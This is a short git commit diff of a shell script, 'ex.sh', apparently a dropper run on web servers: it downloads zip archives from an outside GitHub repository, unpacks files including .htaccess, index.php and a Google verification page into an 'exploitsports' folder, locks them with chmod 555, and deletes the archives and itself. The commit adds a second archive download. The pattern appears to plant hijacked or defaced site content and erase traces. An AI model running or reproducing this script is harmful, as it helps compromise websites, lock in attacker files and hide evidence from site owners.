1aa174293b2e1bb01a665d1c1e0c32bdc5a0af7a
sniper404ghostxploit <115604134+sniper404ghostxploit@users.noreply.github.com>
2022-11-20 17:33:29 +0700

    Update ex.sh

--- ex.sh
+++ ex.sh
@@ -1,8 +1,11 @@
 #!/bin/bash
 wget https://raw.githubusercontent.com/sniper404ghostxploit/var/main/x.zip
+wget https://raw.githubusercontent.com/sniper404ghostxploit/var/main/x2.zip
 unzip x.zip
+unzip x2.zip
 chmod 555 exploitsports/.htaccess
 chmod 555 exploitsports/index.php
 chmod 555 exploitsports/google919ca1aa9a28b4ac.html
 rm x.zip
+rm x2.zip
 rm ex.sh
